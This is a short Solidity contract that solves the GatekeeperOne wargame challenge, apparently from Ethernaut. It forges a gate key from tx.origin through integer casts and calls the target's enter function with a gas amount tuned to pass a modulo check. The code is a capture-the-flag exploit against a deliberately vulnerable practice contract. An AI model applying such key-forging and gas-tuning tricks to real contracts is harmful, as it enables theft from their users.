// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperOne} from "./GatekeeperOne.sol";

contract GatekeeperOneAttacker {
    function attack(GatekeeperOne target) public {
        bytes8 key = bytes8(uint64(uint16(uint160(tx.origin))) + 2 ** 32);

        bytes memory params = abi.encodeCall(target.enter, (key));

        bool ok = false;

        (ok,) = address(target).call{gas: 268 + (8191 * 3)}(params);
        require(ok, "Attack did not succeeed");
    }
}
